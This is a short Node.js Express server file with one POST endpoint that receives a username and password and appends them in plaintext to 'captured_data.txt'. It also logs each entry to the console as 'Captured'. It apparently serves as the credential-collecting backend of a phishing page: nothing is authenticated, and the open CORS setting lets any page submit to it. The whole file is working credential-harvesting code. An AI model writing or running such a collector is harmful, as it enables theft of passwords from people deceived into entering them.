const express = require('express');
const fs = require('fs');
const cors = require('cors');
const app = express();
const PORT = 3000;

app.use(cors()); // Allow cross-origin requests (for local testing)
app.use(express.json()); // Parse JSON body

// POST route to receive login data
app.post('/submit', (req, res) => {
  const { username, password } = req.body;
  const logEntry = `Username: ${username} | Password: ${password}\n`;

  fs.appendFile('captured_data.txt', logEntry, (err) => {
    if (err) {
      console.error("Error writing to file:", err);
      return res.status(500).send('Internal server error');
    }
    console.log("Captured:", logEntry.trim());
    res.send('Data received');
  });
});

app.listen(PORT, () => {
  console.log(`🟢 Server running at http://localhost:${PORT}`);
});

